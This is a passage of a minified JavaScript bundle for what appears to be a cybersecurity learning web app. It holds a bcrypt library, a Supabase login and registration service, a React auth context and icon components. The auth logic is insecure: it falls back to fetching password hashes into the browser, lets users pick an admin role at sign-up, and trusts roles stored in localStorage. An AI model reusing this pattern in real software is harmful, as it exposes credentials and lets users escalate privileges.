942726286,933058658,2468411793,3933900994,4215176142,1361170020,2001714738,2830558078,3274259782,1222529897,1679025792,2729314320,3714953764,1770335741,151462246,3013232138,1682292957,1483529935,471910574,1539241949,458788160,3436315007,1807016891,3718408830,978976581,1043663428,3165965781,1927990952,4200891579,2372276910,3208408903,3533431907,1412390302,2931980059,4132332400,1947078029,3881505623,4168226417,2941484381,1077988104,1320477388,886195818,18198404,3786409e3,2509781533,112762804,3463356488,1866414978,891333506,18488651,661792760,1628790961,3885187036,3141171499,876946877,2693282273,1372485963,791857591,2686433993,3759982718,3167212022,3472953795,2716379847,445679433,3561995674,3504004811,3574258232,54117162,3331405415,2381918588,3769707343,4154350007,1140177722,4074052095,668550556,3214352940,367459370,261225585,2610173221,4209349473,3468074219,3265815641,314222801,3066103646,3808782860,282218597,3406013506,3773591054,379116347,1285071038,846784868,2669647154,3771962079,3550491691,2305946142,453669953,1268987020,3317592352,3279303384,3744833421,2610507566,3859509063,266596637,3847019092,517658769,3462560207,3443424879,370717030,4247526661,2224018117,4143653529,4112773975,2788324899,2477274417,1456262402,2901442914,1517677493,1846949527,2295493580,3734397586,2176403920,1280348187,1908823572,3871786941,846861322,1172426758,3287448474,3383383037,1655181056,3139813346,901632758,1897031941,2986607138,3066810236,3447102507,1393639104,373351379,950779232,625454576,3124240540,4148612726,2007998917,544563296,2244738638,2330496472,2058025392,1291430526,424198748,50039436,29584100,3605783033,2429876329,2791104160,1057563949,3255363231,3075367218,3463963227,1469046755,985887462],w0=[1332899944,1700884034,1701343084,1684370003,1668446532,1869963892];function $a(a,n,s,i){var o,c=a[n],d=a[n+1];return c^=s[0],o=i[c>>>24],o+=i[256|c>>16&255],o^=i[512|c>>8&255],o+=i[768|c&255],d^=o^s[1],o=i[d>>>24],o+=i[256|d>>16&255],o^=i[512|d>>8&255],o+=i[768|d&255],c^=o^s[2],o=i[c>>>24],o+=i[256|c>>16&255],o^=i[512|c>>8&255],o+=i[768|c&255],d^=o^s[3],o=i[d>>>24],o+=i[256|d>>16&255],o^=i[512|d>>8&255],o+=i[768|d&255],c^=o^s[4],o=i[c>>>24],o+=i[256|c>>16&255],o^=i[512|c>>8&255],o+=i[768|c&255],d^=o^s[5],o=i[d>>>24],o+=i[256|d>>16&255],o^=i[512|d>>8&255],o+=i[768|d&255],c^=o^s[6],o=i[c>>>24],o+=i[256|c>>16&255],o^=i[512|c>>8&255],o+=i[768|c&255],d^=o^s[7],o=i[d>>>24],o+=i[256|d>>16&255],o^=i[512|d>>8&255],o+=i[768|d&255],c^=o^s[8],o=i[c>>>24],o+=i[256|c>>16&255],o^=i[512|c>>8&255],o+=i[768|c&255],d^=o^s[9],o=i[d>>>24],o+=i[256|d>>16&255],o^=i[512|d>>8&255],o+=i[768|d&255],c^=o^s[10],o=i[c>>>24],o+=i[256|c>>16&255],o^=i[512|c>>8&255],o+=i[768|c&255],d^=o^s[11],o=i[d>>>24],o+=i[256|d>>16&255],o^=i[512|d>>8&255],o+=i[768|d&255],c^=o^s[12],o=i[c>>>24],o+=i[256|c>>16&255],o^=i[512|c>>8&255],o+=i[768|c&255],d^=o^s[13],o=i[d>>>24],o+=i[256|d>>16&255],o^=i[512|d>>8&255],o+=i[768|d&255],c^=o^s[14],o=i[c>>>24],o+=i[256|c>>16&255],o^=i[512|c>>8&255],o+=i[768|c&255],d^=o^s[15],o=i[d>>>24],o+=i[256|d>>16&255],o^=i[512|d>>8&255],o+=i[768|d&255],c^=o^s[16],a[n]=d^s[Pv+1],a[n+1]=c,a}function Cn(a,n){for(var s=0,i=0;s<4;++s)i=i<<8|a[n]&255,n=(n+1)%a.length;return{key:i,offp:n}}function vm(a,n,s){for(var i=0,o=[0,0],c=n.length,d=s.length,m,f=0;f<c;f++)m=Cn(a,i),i=m.offp,n[f]=n[f]^m.key;for(f=0;f<c;f+=2)o=$a(o,0,n,s),n[f]=o[0],n[f+1]=o[1];for(f=0;f<d;f+=2)o=$a(o,0,n,s),s[f]=o[0],s[f+1]=o[1]}function Iv(a,n,s,i){for(var o=0,c=[0,0],d=s.length,m=i.length,f,x=0;x<d;x++)f=Cn(n,o),o=f.offp,s[x]=s[x]^f.key;for(o=0,x=0;x<d;x+=2)f=Cn(a,o),o=f.offp,c[0]^=f.key,f=Cn(a,o),o=f.offp,c[1]^=f.key,c=$a(c,0,s,i),s[x]=c[0],s[x+1]=c[1];for(x=0;x<m;x+=2)f=Cn(a,o),o=f.offp,c[0]^=f.key,f=Cn(a,o),o=f.offp,c[1]^=f.key,c=$a(c,0,s,i),i[x]=c[0],i[x+1]=c[1]}function ym(a,n,s,i,o){var c=w0.slice(),d=c.length,m;if(s<4||s>31)if(m=Error("Illegal number of rounds (4-31): "+s),i){lr(i.bind(this,m));return}else throw m;if(n.length!==Ma)if(m=Error("Illegal salt length: "+n.length+" != "+Ma),i){lr(i.bind(this,m));return}else throw m;s=1<<s>>>0;var f,x,p=0,b;typeof Int32Array=="function"?(f=new Int32Array(gm),x=new Int32Array(bm)):(f=gm.slice(),x=bm.slice()),Iv(n,a,f,x);function w(){if(o&&o(p/s),p<s)for(var N=Date.now();p<s&&(p=p+1,vm(a,f,x),vm(n,f,x),!(Date.now()-N>Rv)););else{for(p=0;p<64;p++)for(b=0;b<d>>1;b++)$a(c,b<<1,f,x);var k=[];for(p=0;p<d;p++)k.push((c[p]>>24&255)>>>0),k.push((c[p]>>16&255)>>>0),k.push((c[p]>>8&255)>>>0),k.push((c[p]&255)>>>0);if(i){i(null,k);return}else return k}i&&lr(w)}if(typeof i<"u")w();else for(var j;;)if(typeof(j=w())<"u")return j||[]}function sd(a,n,s,i){var o;if(typeof a!="string"||typeof n!="string")if(o=Error("Invalid string / salt: Not a string"),s){lr(s.bind(this,o));return}else throw o;var c,d;if(n.charAt(0)!=="$"||n.charAt(1)!=="2")if(o=Error("Invalid salt version: "+n.substring(0,2)),s){lr(s.bind(this,o));return}else throw o;if(n.charAt(2)==="$")c="\0",d=3;else{if(c=n.charAt(2),c!=="a"&&c!=="b"&&c!=="y"||n.charAt(3)!=="$")if(o=Error("Invalid salt revision: "+n.substring(2,4)),s){lr(s.bind(this,o));return}else throw o;d=4}if(n.charAt(d+2)>"$")if(o=Error("Missing salt rounds"),s){lr(s.bind(this,o));return}else throw o;var m=parseInt(n.substring(d,d+1),10)*10,f=parseInt(n.substring(d+1,d+2),10),x=m+f,p=n.substring(d+3,d+25);a+=c>="a"?"\0":"";var b=Tv(a),w=y0(p,Ma);function j(N){var k=[];return k.push("$2"),c>="a"&&k.push(c),k.push("$"),x<10&&k.push("0"),k.push(x.toString()),k.push("$"),k.push(jo(w,w.length)),k.push(jo(N,w0.length*4-1)),k.join("")}if(typeof s>"u")return j(ym(b,w,x));ym(b,w,x,function(N,k){N?s(N,null):s(null,j(k))},i)}function Lv(a,n){return jo(a,n)}function Ov(a,n){return y0(a,n)}const wm={setRandomFallback:Fv,genSaltSync:Nd,genSalt:p0,hashSync:x0,hash:g0,compareSync:_v,compare:Sv,getRounds:Av,getSalt:Ev,truncates:Cv,encodeBase64:Lv,decodeBase64:Ov};function Dv(){return"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,function(a){const n=Math.random()*16|0;return(a==="x"?n:n&3|8).toString(16)})}function jm(a){const n={...a};return"password_hash"in n&&delete n.password_hash,n}class Mv{async login(n){try{await xm();const{data:s,error:i}=await Z.auth.signInWithPassword({email:n.email,password:n.password});if(i){console.warn("Supabase auth failed, attempting legacy DB fallback:",i.message);const{data:x,error:p}=await Z.from("users").select("*").eq("email",n.email).eq("role",n.role).maybeSingle();if(p)throw console.error("Login error:",p),new Error(`Database error during login: ${p.message}`);if(!x)throw new Error(`No ${n.role} account found with email: ${n.email}`);if(!await wm.compare(n.password,x.password_hash??""))throw new Error("Incorrect password. Please try again.");const w=jm(x);return localStorage.setItem("cyberSecUser",JSON.stringify(w)),w}const o=s.user;if(!o)throw new Error("Signed in but no user returned from Supabase Auth");const{data:c,error:d}=await Z.from("users").select("*").eq("email",o.email).maybeSingle();d&&console.warn("Failed to fetch profile row after sign-in:",d.message);const m=c||void 0;let f;return m?f=jm(m):f={id:o.id,email:o.email,name:o.user_metadata?.full_name},localStorage.setItem("cyberSecUser",JSON.stringify(f)),f}catch(s){throw console.error("Login error:",s),s}}async register(n){try{await xm();const s=await wm.hash(n.password,10),{data:i,error:o}=await Z.auth.signUp({email:n.email,password:n.password,options:{data:{full_name:n.name}}});o&&(console.error("Supabase signUp error:",o),console.warn("Auth signup failed, proceeding with direct profile creation..."));const m={id:i?.user?.id??Dv(),email:n.email,name:n.name||"User",role:n.role,password_hash:s,level:"beginner",completed_assessment:n.role==="admin",bio:n.bio||"",specialization:n.specialization||"",experience_years:n.role==="student"?null:"0-1"},{data:f,error:x}=await Z.from("users").upsert([m],{onConflict:"id"}).select().maybeSingle();if(x)throw console.error("Registration error while creating profile:",x),new Error(`Failed to create profile: ${x.message}`);const b={...f||m};return delete b.password_hash,localStorage.setItem("cyberSecUser",JSON.stringify(b)),b}catch(s){console.error("Registration error:",s);const i=s instanceof Error?s.message:"Registration failed. Please try again.";throw new Error(i)}}async logout(){localStorage.removeItem("cyberSecUser")}getCurrentUser(){const n=localStorage.getItem("cyberSecUser");return n?JSON.parse(n):null}isAdmin(){return this.getCurrentUser()?.role==="admin"}isTeacher(){return this.getCurrentUser()?.role==="teacher"}isStudent(){return this.getCurrentUser()?.role==="student"}hasRole(n){return this.getCurrentUser()?.role===n}}const Ds=new Mv,j0=v.createContext(void 0),$v=({children:a})=>{const[n,s]=v.useState(null),[i,o]=v.useState(!0);v.useEffect(()=>{const w=Ds.getCurrentUser();s(w),o(!1)},[]);const c=async(w,j,N="student")=>{try{const k={email:w,password:j,role:N},F=await Ds.login(k);return s(F),!0}catch(k){throw console.error("Login failed:",k),k}},d=async(w,j,N,k="student",F,T)=>{try{const R={email:w,password:j,name:N,role:k,bio:F,specialization:T},S=await Ds.register(R);return s(S),!0}catch(R){throw console.error("Registration failed:",R),R}},m=()=>{Ds.logout(),s(null)},f=w=>{if(n){const j={...n,...w};s(j),localStorage.setItem("cyberSecUser",JSON.stringify(j))}},x=()=>Ds.isAdmin(),p=()=>Ds.isTeacher(),b=()=>Ds.isStudent();return e.jsx(j0.Provider,{value:{user:n,loading:i,login:c,register:d,logout:m,updateUser:f,isAdmin:x,isTeacher:p,isStudent:b},children:a})},Ie=()=>{const a=v.useContext(j0);if(a===void 0)throw new Error("useAuth must be used within an AuthProvider");return a};var Bv={xmlns:"http://www.w3.org/2000/svg",width:24,height:24,viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:2,strokeLinecap:"round",strokeLinejoin:"round"};const Uv=a=>a.replace(/([a-z0-9])([A-Z])/g,"$1-$2").toLowerCase().trim(),re=(a,n)=>{const s=v.forwardRef(({color:i="currentColor",size:o=24,strokeWidth:c=2,absoluteStrokeWidth:d,className:m="",children:f,...x},p)=>v.createElement("svg",{ref:p,...Bv,width:o,height:o,stroke:i,strokeWidth:d?Number(c)*24/Number(o):c,className:["lucide",`lucide-${Uv(a)}`,m].join(" "),...x},[...n.map(([b,w])=>v.createElement(b,w)),...Array.isArray(f)?f:[f]]));return s.displayName=`${a}`,s};const xs=re("Activity",[["path",{d:"M22 12h-4l-3 9L9 3l-3 9H2",key:"d5dnw9"}]]);const zv=re("AlertCircle",[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["line",{x1:"12",x2:"12",y1:"8",y2:"12",key:"1pkeuh"}],["line",{x1:"12",x2:"12.01",y1:"16",y2:"16",key:"4dfq90"}]]);const or=re("AlertTriangle",[["path",{d:"m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z",key:"c3ski4"}],["path",{d:"M12 9v4",key:"juzpu7"}],["path",{d:"M12 17h.01",key:"p32p05"}]]);const ys=re("ArrowLeft",[["path",{d:"m12 19-7-7 7-7",key:"1l729n"}],["path",{d:"M19 12H5",key:"x3x0zl"}]]);const Or=re("ArrowRight",[["path",{d:"M5 12h14",key:"1ays0h"}],["path",{d:"m12 5 7 7-7 7",key:"xquz4c"}]]);const tt=re("Award",[["circle",{cx:"12",cy:"8",r:"6",key:"1vp47v"}],["path",{d:"M15.477 12.89 17 22l-5-3-5 3 1.523-9.11",key:"em7aur"}]]);const qv=re("BarChart3",[["path",{d:"M3 3v18h18",key:"1s2lah"}],["path",{d:"M18 17V9",key:"2bz60n"}],["path",{d:"M13 17V5",key:"1frdt8"}],["path",{d:"M8 17v-3",key:"17ska0"}]]);const N0=re("BarChart",[["line",{x1:"12",x2:"12",y1:"20",y2:"10",key:"1vz5eb"}],["line",{x1:"18",x2:"18",y1:"20",y2:"4",key:"cun8e5"}],["line",{x1:"6",x2:"6",y1:"20",y2:"16",key:"hq0ia6"}]]);const Wv=re("Bell",[["path",{d:"M6 8a6 6 0 0 1 12 0c0 7 3 9 3 9H3s3-2 3-9",key:"1qo2s2"}],["path",{d:"M10.3 21a1.94 1.94 0 0 0 3.4 0",key:"qgo35s"}]]);const Vv=re("Bold",[["path",{d:"M14 12a4 4 0 0 0 0-8H6v8",key:"v2sylx"}],["path",{d:"M15 20a4 4 0 0 0 0-8H6v8Z",key:"1ef5ya"}]]);const xr=re("BookOpen",[["path",{d:"M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2z",key:"vv98re"}],["path",{d:"M22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z",key:"1cyq3y"}]]);const nd=re("Bot",[["path",{d:"M12 8V4H8",key:"hb8ula"}],["rect",{width:"16",height:"12",x:"4",y:"8",rx:"2",key:"enze0r"}],["path",{d:"M2 14h2",key:"vft8re"}],["path",{d:"M20 14h2",key:"4cs60a"}],["path",{d:"M15 13v2",key:"1xurst"}],["path",{d:"M9 13v2",key:"rq6x2g"}]]);const ad=re("Brain",[["path",{d:"M12 5a3 3 0 1 0-5.997.125 4 4 0 0 0-2.526 5.77 4 4 0 0 0 .556 6.588A4 4 0 1 0 12 18Z",key:"l5xja"}],["path",{d:"M12 5a3 3 0 1 1 5.997.125 4 4 0 0 1 2.526 5.77 4 4 0 0 1-.556 6.588A4 4 0 1 1 12 18Z",key:"ep3f8r"}],["path",{d:"M15 13a4.5 4.5 0 0 1-3-4 4.5 4.5 0 0 1-3 4",key:"1p4c4q"}],["path",{d:"M17.599 6.5a3 3 0 0 0 .399-1.375",key:"tmeiqw"}],["path",{d:"M6.003 5.125A3 3 0 0 0 6.401 6.5",key:"105sqy"}],["path",{d:"M3.477 10.896a4 4 0 0 1 .585-.396",key:"ql3yin"}],["path",{d:"M19.938 10.5a4 4 0 0 1 .585.396",key:"1qfode"}],["path",{d:"M6 18a4 4 0 0 1-1.967-.516",key:"2e4loj"}],["path",{d:"M19.967 17.484A4 4 0 0 1 18 18",key:"159ez6"}]]);const k0=re("Briefcase",[["rect",{width:"20",height:"14",x:"2",y:"7",rx:"2",ry:"2",key:"eto64e"}],["path",{d:"M16 21V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v16",key:"zwj3tp"}]]);const Hv=re("Building2",[["path",{d:"M6 22V4a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2v18Z",key:"1b4qmf"}],["path",{d:"M6 12H4a2 2 0 0 0-2 2v6a2 2 0 0 0 2 2h2",key:"i71pzd"}],["path",{d:"M18 9h2a2 2 0 0 1 2 2v9a2 2 0 0 1-2 2h-2",key:"10jefs"}],["path",{d:"M10 6h4",key:"1itunk"}],["path",{d:"M10 10h4",key:"tcdvrf"}],["path",{d:"M10 14h4",key:"kelpxr"}],["path",{d:"M10 18h4",key:"1ulq68"}]]);const Gv=re("Building",[["rect",{width:"16",height:"20",x:"4",y:"2",rx:"2",ry:"2",key:"76otgf"}],["path",{d:"M9 22v-4h6v4",key:"r93iot"}],["path",{d:"M8 6h.01",key:"1dz90k"}],["path",{d:"M16 6h.01",key:"1x0f13"}],["path",{d:"M12 6h.01",key:"1vi96p"}],["path",{d:"M12 10h.01",key:"1nrarc"}],["path",{d:"M12 14h.01",key:"1etili"}],["path",{d:"M16 10h.01",key:"1m94wz"}],["path",{d:"M16 14h.01",key:"1gbofw"}],["path",{d:"M8 10h.01",key:"19clt8"}],["path",{d:"M8 14h.01",key:"6423bh"}]]);const xo=re("Calendar",[["path",{d:"M8 2v4",key:"1cmpym"}],["path",{d:"M16 2v4",key:"4m81vk"}],["rect",{width:"18",height:"18",x:"3",y:"4",rx:"2",key:"1hopcy"}],["path",{d:"M3 10h18",key:"8toen8"}]]);const Nm=re("Camera",[["path",{d:"M14.5 4h-5L7 7H4a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2h-3l-2.5-3z",key:"1tc9qg"}],["circle",{cx:"12",cy:"13",r:"3",key:"1vg3eu"}]]);const Pe=re("CheckCircle",[["path",{d:"M22 11.08V12a10 10 0 1 1-5.93-9.14",key:"g774vq"}],["path",{d:"m9 11 3 3L22 4",key:"1pflzl"}]]);const km=re("Check",[["path",{d:"M20 6 9 17l-5-5",key:"1gmf2c"}]]);const Yt=re("ChevronRight",[["path",{d:"m9 18 6-6-6-6",key:"mthhwq"}]]);const Qv=re("ClipboardCheck",[["rect",{width:"8",height:"4",x:"8",y:"2",rx:"1",ry:"1",key:"tgr4d6"}],["path",{d:"M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2",key:"116196"}],["path",{d:"m9 14 2 2 4-4",key:"df797q"}]]);const Pt=re("Clock",[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["polyline",{points:"12 6 12 12 16 14",key:"68esgv"}]]);const Kv=re("Code",[["polyline",{points:"16 18 22 12 16 6",key:"z7tu5w"}],["polyline",{points:"8 6 2 12 8 18",key:"1eg1df"}]]);const Yv=re("CreditCard",[["rect",{width:"20",height:"14",x:"2",y:"5",rx:"2",key:"ynyp8z"}],["line",{x1:"2",x2:"22",y1:"10",y2:"10",key:"1b3vmo"}]]);const Jv=re("Crown",[["path",{d:"m2 4 3 12h14l3-12-6 7-4-7-4 7-6-7zm3 16h14",key:"zkxr6b"}]]);const Xv=re("Database",[["ellipse",{cx:"12",cy:"5",rx:"9",ry:"3",key:"msslwz"}],["path",{d:"M3 5V19A9 3 0 0 0 21 19V5",key:"1wlel7"}],["path",{d:"M3 12A9 3 0 0 0 21 12",key:"mv7ke4"}]]);const Zv=re("DollarSign",[["line",{x1:"12",x2:"12",y1:"2",y2:"22",key:"7eqyqh"}],["path",{d:"M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6",key:"1b0p4s"}]]);const Us=re("Download",[["path",{d:"M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4",key:"ih7n3h"}],["polyline",{points:"7 10 12 15 17 10",key:"2ggqvy"}],["line",{x1:"12",x2:"12",y1:"15",y2:"3",key:"1vk2je"}]]);const Ao=re("ExternalLink",[["path",{d:"M15 3h6v6",key:"1q9fwt"}],["path",{d:"M10 14 21 3",key:"gplh6r"}],["path",{d:"M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6",key:"a6xqqp"}]]);const id=re("EyeOff",[["path",{d:"M9.88 9.88a3 3 0 1 0 4.24 4.24",key:"1jxqfv"}],["path",{d:"M10.73 5.08A10.43 10.43 0 0 1 12 5c7 0 10 7 10 7a13.16 13.16 0 0 1-1.67 2.68",key:"9wicm4"}],["path",{d:"M6.61 6.61A13.526 13.526 0 0 0 2 12s3 7 10 7a9.74 9.74 0 0 0 5.39-1.61",key:"1jreej"}],["line",{x1:"2",x2:"22",y1:"2",y2:"22",key:"a6p6uj"}]]);const gs=re("Eye",[["path",{d:"M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z",key:"rwhkz3"}],["circle",{cx:"12",cy:"12",r:"3",key:"1v7zrd"}]]);const Fm=re("FileCode",[["path",{d:"M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z",key:"1rqfz7"}],["path",{d:"M14 2v4a2 2 0 0 0 2 2h4",key:"tnqrlb"}],["path",{d:"m10 13-2 2 2 2",key:"17smn8"}],["path",{d:"m14 17 2-2-2-2",key:"14mezr"}]]);const Mt=re("FileText",[["path",{d:"M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z",key:"1rqfz7"}],["path",{d:"M14 2v4a2 2 0 0 0 2 2h4",key:"tnqrlb"}],["path",{d:"M10 9H8",key:"b1mrlr"}],["path",{d:"M16 13H8",key:"t4e002"}],["path",{d:"M16 17H8",key:"z1uh3a"}]]);const _m=re("Film",[["rect",{width:"18",height:"18",x:"3",y:"3",rx:"2",key:"afitv7"}],["path",{d:"M7 3v18",key:"bbkbws"}],["path",{d:"M3 7.5h4",key:"zfgn84"}],["path",{d:"M3 12h18",key:"1i2n21"}],["path",{d:"M3 16.5h4",key:"1230mu"}],["path",{d:"M17 3v18",key:"in4fa5"}],["path",{d:"M17 7.5h4",key:"myr1c1"}],["path",{d:"M17 16.5h4",key:"go4c1d"}]]);const od=re("Filter",[["polygon",{points:"22 3 2 3 10 12.46 10 19 14 21 14 12.46 22 3",key:"1yg77f"}]]);const Pn=re("FlaskRound",[["path",{d:"M10 2v7.31",key:"5d1hyh"}],["path",{d:"M14 9.3V1.99",key:"14k4l0"}],["path",{d:"M8.5 2h7",key:"csnxdl"}],["path",{d:"M14 9.3a6.5 6.5 0 1 1-4 0",key:"1r8fvy"}],["path",{d:"M5.52 16h12.96",key:"46hh1i"}]]);const Ic=re("Folder",[["path",{d:"M20 20a2 2 0 0 0 2-2V8a2 2 0 0 0-2-2h-7.9a2 2 0 0 1-1.69-.9L9.6 3.9A2 2 0 0 0 7.93 3H4a2 2 0 0 0-2 2v13a2 2 0 0 0 2 2Z",key:"1kt360"}]]);const In=re("Globe",[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["path",{d:"M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20",key:"13o1zl"}],["path",{d:"M2 12h20",key:"9i4pu4"}]]);const No=re("GraduationCap",[["path",{d:"M21.42 10.922a1 1 0 0 0-.019-1.838L12.83 5.18a2 2 0 0 0-1.66 0L2.6 9.08a1 1 0 0 0 0 1.832l8.57 3.908a2 2 0 0 0 1.66 0z",key:"j76jl0"}],["path",{d:"M22 10v6",key:"1lu8f3"}],["path",{d:"M6 12.5V16a6 3 0 0 0 12 0v-3.5",key:"1r8lef"}]]);const ey=re("Hash",[["line",{x1:"4",x2:"20",y1:"9",y2:"9",key:"4lhtct"}],["line",{x1:"4",x2:"20",y1:"15",y2:"15",key:"vyu0kd"}],["line",{x1:"10",x2:"8",y1:"3",y2:"21",key:"1ggp8o"}],["line",{x1:"16",x2:"14",y1:"3",y2:"21",key:"weycgp"}]]);const ty=re("Heart",[["path",{d:"M19 14c1.49-1.46 3-3.21 3-5.5A5.5 5.5 0 0 0 16.5 3c-1.76 0-3 .5-4.5 2-1.5-1.5-2.74-2-4.5-2A5.5 5.5 0 0 0 2 8.5c0 2.3 1.5 4.05 3 5.5l7 7Z",key:"c3ymky"}]]);const ry=re("Image",[["rect",{width:"18",height:"18",x:"3",y:"3",rx:"2",ry:"2",key:"1m3agn"}],["circle",{cx:"9",cy:"9",r:"2",key:"af1f0g"}],["path",{d:"m21 15-3.086-3.086a2 2 0 0 0-2.828 0L6 21",key:"1xmnt7"}]]);const sy=re("Italic",[["line",{x1:"19",x2:"10",y1:"4",y2:"4",key:"15jd3p"}],["line",{x1:"14",x2:"5",y1:"20",y2:"20",key:"bu0au3"}],["line",{x1:"15",x2:"9",y1:"4",y2:"20",key:"uljnxc"}]]);const Fd=re("LayoutDashboard",[["rect",{width:"7",height:"9",x:"3",y:"3",rx:"1",key:"10lvy0"}],["rect",{width:"7",height:"5",x:"14",y:"3",rx:"1",key:"16une8"}],["rect",{width:"7",height:"9",x:"14",y:"12",rx:"1",key:"1hutg5"}],["rect",{width:"7",height:"5",x:"3",y:"16",rx:"1",key:"ldoo1y"}]]);const lo=re("Lightbulb",[["path",{d:"M15 14c.2-1 .7-1.7 1.5-2.5 1-.9 1.5-2.2 1.5-3.5A6 6 0 0 0 6 8c0 1 .2 2.2 1.5 3.5.7.7 1.3 1.5 1.5 2.5",key:"1gvzjb"}],["path",{d:"M9 18h6",key:"x1upvd"}],["path",{d:"M10 22h4",key:"ceow96"}]]);const F0=re("Link",[["path",{d:"M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71",key:"1cjeqo"}],["path",{d:"M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71",key:"19qd67"}]]);const ny=re("List",[["line",{x1:"8",x2:"21",y1:"6",y2:"6",key:"7ey8pc"}],["line",{x1:"8",x2:"21",y1:"12",y2:"12",key:"rjfblc"}],["line",{x1:"8",x2:"21",y1:"18",y2:"18",key:"c3b1m8"}],["line",{x1:"3",x2:"3.01",y1:"6",y2:"6",key:"1g7gq3"}],["line",{x1:"3",x2:"3.01",y1:"12",y2:"12",key:"1pjlvk"}],["line",{x1:"3",x2:"3.01",y1:"18",y2:"18",key:"28t2mc"}]]);const ay=re("Loader2",[["path",{d:"M21 12a9 9 0 1 1-6.219-8.56",key:"13zald"}]]);const vt=re("Lock",[["rect",{width:"18",height:"11",x:"3",y:"11",rx:"2",ry:"2",key:"1w4ew1"}],["path",{d:"M7 11V7a5 5 0 0 1 10 0v4",key:"fwvmzm"}]]);const Eo=re("LogOut",[["path",{d:"M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4",key:"1uf3rs"}],["polyline",{points:"16 17 21 12 16 7",key:"1gabdz"}],["line",{x1:"21",x2:"9",y1:"12",y2:"12",key:"1uyos4"}]]);const _d=re("Mail",[["rect",{width:"20",height:"16",x:"2",y:"4",rx:"2",key:"18n3k1"}],["path",{d:"m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7",key:"1ocrg3"}]]);const _0=re("MapPin",[["path",{d:"M20 10c0 6-8 12-8 12s-8-6-8-12a8 8 0 0 1 16 0Z",key:"2oe9fu"}],["circle",{cx:"12",cy:"10",r:"3",key:"ilqhr7"}]]);const iy=re("Maximize",[["path",{d:"M8 3H5a2 2 0 0 0-2 2v3",key:"1dcmit"}],["path",{d:"M21 8V5a2 2 0 0 0-2-2h-3",key:"1e4gt3"}],["path",{d:"M3 16v3a2 2 0 0 0 2 2h3",key:"wsl5sc"}],["path",{d:"M16 21h3a2 2 0 0 0 2-2v-3",key:"18trek"}]]);const oy=re("Menu",[["line",{x1:"4",x2:"20",y1:"12",y2:"12",key:"1e0a9i"}],["line",{x1:"4",x2:"20",y1:"6",y2:"6",key:"1owob3"}],["line",{x1:"4",x2:"20",y1:"18",y2:"18",key:"yk5zj1"}]]);const Sm=re("MessageSquare",[["path",{d:"M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z",key:"1lielz"}]]);const ld=re("Mic",[["path",{d:"M12 2a3 3 0 0 0-3 3v7a3 3 0 0 0 6 0V5a3 3 0 0 0-3-3Z",key:"131961"}],["path",{d:"M19 10v2a7 7 0 0 1-14 0v-2",key:"1vc78b"}],["line",{x1:"12",x2:"12",y1:"19",y2:"22",key:"x3vr5v"}]]);const ly=re("Monitor",[["rect",{width:"20",height:"14",x:"2",y:"3",rx:"2",key:"48i651"}],["line",{x1:"8",x2:"16",y1:"21",y2:"21",key:"1svkeh"}],["line",{x1:"12",x2:"12",y1:"17",y2:"21",key:"vw1qmm"}]]);const cy=re("MoreHorizontal",[["circle",{cx:"12",cy:"12",r:"1",key:"41hilf"}],["circle",{cx:"19",cy:"12",r:"1",key:"1wjl8i"}],["circle",{cx:"5",cy:"12",r:"1",key:"1pcz8c"}]]);const Am=re("Pause",[["rect",{width:"4",height:"16",x:"6",y:"4",key:"iffhe4"}],["rect",{width:"4",height:"16",x:"14",y:"4",key:"sjin7j"}]]);const Bt=re("Play",[["polygon",{points:"5 3 19 12 5 21 5 3",key:"191637"}]]);const dy=re("PlusCircle",[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["path",{d:"M8 12h8",key:"1wcyev"}],["path",{d:"M12 8v8",key:"napkw2"}]]);const cd=re("Plus",[["path",{d:"M5 12h14",key:"1ays0h"}],["path",{d:"M12 5v14",key:"s699le"}]]);const Ba=re("RefreshCw",[["path",{d:"M3 12a9 9 0 0 1 9-9 9.75 9.75 0 0 1 6.74 2.74L21 8",key:"v9h5vc"}],["path",{d:"M21 3v5h-5",key:"1q7to0"}],["path",{d:"M21 12a9 9 0 0 1-9 9 9.75 9.75 0 0 1-6.74-2.74L3 16",key:"3uifl3"}],["path",{d:"M8 16H3v5",key:"1cv678"}]]);const uy=re("RotateCcw",[["path",{d:"M3 12a9 9 0 1 0 9-9 9.75 9.75 0 0 0-6.74 2.74L3 8",key:"1357e3"}],["path",{d:"M3 3v5h5",key:"1xhq8a"}]]);const S0=re("Save",[["path",{d:"M19 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11l5 5v11a2 2 0 0 1-2 2z",key:"1owoqh"}],["polyline",{points:"17 21 17 13 7 13 7 21",key:"1md35c"}],["polyline",{points:"7 3 7 8 15 8",key:"8nz8an"}]]);const 